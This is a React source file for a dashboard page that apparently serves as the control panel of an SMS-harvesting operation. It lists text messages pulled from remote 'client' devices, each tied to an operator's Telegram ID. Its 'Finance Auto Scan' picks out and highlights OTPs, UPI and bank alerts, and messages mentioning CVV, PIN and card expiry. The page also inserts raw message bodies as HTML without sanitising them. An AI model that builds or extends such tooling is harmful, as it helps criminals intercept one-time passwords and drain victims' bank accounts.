import { useEffect, useState, useMemo } from 'react';
import { db } from '@/lib/firebase';
import { ref, onValue } from 'firebase/database';
import { Layout } from '@/components/layout';
import { useAuth } from '@/lib/auth';
import {
  MessageSquare, Search, TrendingUp, AlertCircle,
  IndianRupee, Copy, ChevronDown, ChevronUp, Smartphone
} from 'lucide-react';
import { format } from 'date-fns';
import { Reveal, Eyebrow, PageHeader } from '@/components/ui/bezel';
import { cn } from '@/lib/utils';

// Finance keywords for auto-scan
const FINANCE_KEYWORDS = [
  'otp', 'debit', 'credit', 'upi', 'payment', 'transaction', 'transferred',
  'paid', 'received', 'balance', 'account', 'bank', 'withdraw', 'deposit',
  'inr', '₹', 'rs.', 'rs ', 'neft', 'imps', 'rtgs', 'paytm', 'phonepe',
  'gpay', 'googlepay', 'bhim', 'razorpay', 'amount', 'credited', 'debited',
  'sbi', 'hdfc', 'icici', 'axis', 'kotak', 'pnb', 'bob', 'canara',
  'net banking', 'atm', 'card', 'cvv', 'pin', 'expiry', 'insufficient',
];

function isFinance(text: string): boolean {
  const lower = text.toLowerCase();
  return FINANCE_KEYWORDS.some((kw) => lower.includes(kw));
}

// Highlight matched finance keywords
function highlightFinance(text: string) {
  if (!text) return text;
  let result = text;
  const lower = text.toLowerCase();
  const matches: { start: number; end: number; kw: string }[] = [];
  FINANCE_KEYWORDS.forEach((kw) => {
    let idx = lower.indexOf(kw);
    while (idx !== -1) {
      matches.push({ start: idx, end: idx + kw.length, kw });
      idx = lower.indexOf(kw, idx + 1);
    }
  });
  if (matches.length === 0) return result;
  matches.sort((a, b) => b.start - a.start);
  matches.forEach(({ start, end }) => {
    result =
      result.slice(0, start) +
      `<mark class="bg-[#8b5cf6]/15 text-[#c4b5fd] font-semibold rounded px-0.5">${result.slice(start, end)}</mark>` +
      result.slice(end);
  });
  return result;
}

interface SmsEntry {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  pushKey: string;
  from: string;
  body: string;
  date: number;
  isFinance: boolean;
}

const TABS = [
  { id: 'all', label: 'All Messages', icon: MessageSquare },
  { id: 'finance', label: 'Finance Scan', icon: IndianRupee },
];

export function AllSms() {
  const { isAdmin, userId } = useAuth();
  const [allSms, setAllSms] = useState<SmsEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('all');
  const [search, setSearch] = useState('');
  const [expandedKeys, setExpandedKeys] = useState<Set<string>>(new Set());
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  useEffect(() => {
    let clientsData: Record<string, any> = {};
    let messagesData: Record<string, any> = {};
    let clientsReady = false;
    let messagesReady = false;

    function rebuild() {
      if (!clientsReady || !messagesReady) return;
      const entries: SmsEntry[] = [];

      Object.entries(messagesData).forEach(([deviceId, smsList]) => {
        const device = clientsData[deviceId] || {};
        if (!isAdmin && device.ownerTelegramId !== userId) return;
        if (!smsList || typeof smsList !== 'object') return;

        Object.entries(smsList as Record<string, any>).forEach(([pushKey, sms]) => {
          const from = sms.sender || sms.from || 'Unknown';
          const body = sms.message || sms.body || '';
          const sortKey = sms.id != null ? sms.id : (sms.date ? parseInt(sms.date) : 0);
          entries.push({
            deviceId,
            deviceModel: device.modelName || device.model || 'Unknown',
            devicePhone: device.mobNo || device.phone || '',
            pushKey,
            from,
            body,
            date: sortKey,
            isFinance: isFinance(body),
          });
        });
      });

      Object.entries(clientsData).forEach(([deviceId, device]) => {
        if (!device.sms) return;
        if (!isAdmin && device.ownerTelegramId !== userId) return;
        if (messagesData[deviceId]) return;

        Object.entries(device.sms as Record<string, any>).forEach(([pushKey, sms]) => {
          entries.push({
            deviceId,
            deviceModel: device.modelName || device.model || 'Unknown',
            devicePhone: device.mobNo || device.phone || '',
            pushKey,
            from: sms.from || 'Unknown',
            body: sms.body || '',
            date: sms.date ? parseInt(sms.date) : 0,
            isFinance: isFinance(sms.body || ''),
          });
        });
      });

      entries.sort((a, b) => b.date - a.date);
      setAllSms(entries.slice(0, 500));
      setLoading(false);
    }

    const unsubClients = onValue(ref(db, 'clients'), (snap) => {
      clientsData = snap.exists() ? snap.val() : {};
      clientsReady = true;
      rebuild();
    });

    const unsubMessages = onValue(ref(db, 'messages'), (snap) => {
      messagesData = snap.exists() ? snap.val() : {};
      messagesReady = true;
      rebuild();
    });

    return () => { unsubClients(); unsubMessages(); };
  }, [isAdmin, userId]);

  const displayed = useMemo(() => {
    let list = activeTab === 'finance' ? allSms.filter((s) => s.isFinance) : allSms;
    if (search) {
      const q = search.toLowerCase();
      list = list.filter(
        (s) =>
          s.body.toLowerCase().includes(q) ||
          s.from.toLowerCase().includes(q) ||
          s.deviceModel.toLowerCase().includes(q) ||
          s.devicePhone.includes(q)
      );
    }
    return list;
  }, [allSms, activeTab, search]);

  const financeCount = allSms.filter((s) => s.isFinance).length;

  const toggleExpand = (key: string) => {
    setExpandedKeys((prev) => {
      const n = new Set(prev);
      n.has(key) ? n.delete(key) : n.add(key);
      return n;
    });
  };

  const copyText = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 1500);
  };

  return (
    <Layout>
      <PageHeader
        eyebrow="Message Relay"
        title="All SMS"
        description={`${allSms.length} total · ${financeCount} finance detected`}
        actions={
          <div className="relative w-full md:w-72">
            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" strokeWidth={1.6} />
            <input
              type="text"
              placeholder="Search messages, sender, device..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="field pl-11 py-3"
            />
          </div>
        }
      />

      {/* Tab island */}
      <div className="flex items-center gap-1 bg-white/[0.04] border border-white/[0.07] rounded-full p-1 w-fit mb-7">
        {TABS.map(({ id, label, icon: Icon }) => {
          const active = activeTab === id;
          return (
            <button
              key={id}
              onClick={() => setActiveTab(id)}
              className={cn(
                'flex items-center gap-2 px-5 py-2 rounded-full text-[13px] font-medium transition-all duration-500 ease-spring',
                active
                  ? 'bg-[#8b5cf6] text-white shadow-[0_8px_24px_-8px_rgba(139,92,246,0.7)]'
                  : 'text-muted-foreground hover:text-foreground'
              )}
            >
              <Icon className="w-4 h-4" strokeWidth={1.6} />
              {label}
              {id === 'finance' && financeCount > 0 && (
                <span className={cn('ml-0.5 text-[11px] px-2 py-0.5 rounded-full font-bold', active ? 'bg-white/20 text-white' : 'bg-[#8b5cf6]/15 text-[#a78bfa]')}>
                  {financeCount}
                </span>
              )}
            </button>
          );
        })}
      </div>

      {/* Finance banner */}
      {activeTab === 'finance' && (
        <Reveal className="mb-6">
          <div className="flex items-start gap-3.5 p-4 rounded-2xl bg-[#8b5cf6]/[0.06] border border-[#8b5cf6]/20">
            <TrendingUp className="w-5 h-5 text-[#a78bfa] flex-shrink-0 mt-0.5" strokeWidth={1.6} />
            <div>
              <p className="text-sm font-semibold text-foreground">Finance Auto Scan</p>
              <p className="text-xs text-muted-foreground mt-1">
                Automatically detected SMS containing OTP, UPI, bank transactions, credit/debit alerts, and payment keywords.
                Highlighted keywords shown in violet.
              </p>
            </div>
          </div>
        </Reveal>
      )}

      {loading ? (
        <div className="space-y-3">
          {[1, 2, 3, 4, 5].map((i) => (
            <div key={i} className="h-20 rounded-3xl animate-pulse bg-white/[0.03] border border-white/[0.05]" />
          ))}
        </div>
      ) : displayed.length === 0 ? (
        <div className="flex flex-col items-center justify-center rounded-[1.75rem] py-24 text-center border border-dashed border-white/10 bg-white/[0.02]">
          <div className="bezel mx-auto w-fit mb-5">
            <div className="bezel-inner w-16 h-16 flex items-center justify-center">
              <AlertCircle className="w-7 h-7 text-muted-foreground" strokeWidth={1.5} />
            </div>
          </div>
          <p className="text-foreground font-medium">
            {activeTab === 'finance' ? 'No financial SMS found yet' : 'No messages found'}
          </p>
          <p className="text-xs text-muted-foreground mt-1">
            {search ? 'Try a different search term.' : 'Waiting for devices to send data.'}
          </p>
        </div>
      ) : (
        <div className="space-y-3">
          {displayed.map((sms, idx) => {
            const key = `${sms.deviceId}-${sms.pushKey}`;
            const expanded = expandedKeys.has(key);
            const preview = sms.body.length > 100 ? sms.body.slice(0, 100) + '…' : sms.body;
            const needsExpand = sms.body.length > 100;
            const finance = sms.isFinance && activeTab === 'finance';

            return (
              <Reveal key={key} delay={(idx % 4) * 50}>
                <div className={cn(
                  'rounded-[1.5rem] overflow-hidden transition-all duration-700 ease-spring border',
                  finance
                    ? 'border-[#8b5cf6]/30 bg-[#8b5cf6]/[0.03]'
                    : 'border-white/[0.07] bg-white/[0.02] hover:border-white/[0.14] hover:bg-white/[0.035]'
                )}>
                  <div className="p-4 flex items-start gap-3.5">
                    <div className="flex-shrink-0 bg-white/[0.04] border border-white/[0.08] rounded-xl p-2 flex flex-col items-center min-w-[52px]">
                      <Smartphone className="w-4 h-4 text-[#a78bfa] mb-1" strokeWidth={1.6} />
                      <span className="text-[9px] font-bold text-muted-foreground text-center leading-tight truncate w-full">
                        {sms.deviceModel.split(' ').slice(-1)[0]}
                      </span>
                    </div>

                    <div className="flex-1 min-w-0">
                      <div className="flex flex-wrap items-center gap-2 mb-1.5">
                        <span className="text-xs font-bold bg-white/[0.05] text-[#c4b5fd] px-2.5 py-0.5 rounded-full border border-white/[0.08]">
                          {sms.from}
                        </span>
                        {sms.isFinance && (
                          <span className="text-[10px] font-bold bg-[#34d399]/12 text-[#34d399] px-2 py-0.5 rounded-full flex items-center gap-1 border border-[#34d399]/20">
                            <IndianRupee className="w-2.5 h-2.5" strokeWidth={1.8} /> FINANCE
                          </span>
                        )}
                        <span className="text-[10px] text-muted-foreground ml-auto">
                          {sms.date ? format(new Date(sms.date), 'dd MMM · HH:mm') : '—'}
                        </span>
                      </div>

                      <div className="text-sm text-foreground/90 leading-relaxed break-words">
                        {expanded || !needsExpand ? (
                          <span
                            dangerouslySetInnerHTML={{
                              __html: finance ? highlightFinance(sms.body) : sms.body,
                            }}
                          />
                        ) : (
                          <span>{preview}</span>
                        )}
                      </div>

                      <div className="flex items-center gap-3 mt-2">
                        <span className="text-[10px] text-muted-foreground">{sms.devicePhone}</span>
                        {needsExpand && (
                          <button
                            onClick={() => toggleExpand(key)}
                            className="text-[10px] text-[#a78bfa] font-semibold flex items-center gap-0.5"
                          >
                            {expanded ? <><ChevronUp className="w-3 h-3" strokeWidth={1.6} /> Less</> : <><ChevronDown className="w-3 h-3" strokeWidth={1.6} /> More</>}
                          </button>
                        )}
                      </div>
                    </div>

                    <button
                      onClick={() => copyText(sms.body, key)}
                      className="flex-shrink-0 p-2 rounded-xl hover:bg-white/[0.06] text-muted-foreground hover:text-[#a78bfa] border border-transparent hover:border-white/[0.1] transition-all duration-500 ease-spring"
                      title="Copy"
                    >
                      {copiedKey === key ? (
                        <span className="text-[10px] font-bold text-[#34d399]">✓</span>
                      ) : (
                        <Copy className="w-3.5 h-3.5" strokeWidth={1.6} />
                      )}
                    </button>
                  </div>
                </div>
              </Reveal>
            );
          })}
        </div>
      )}
    </Layout>
  );
}
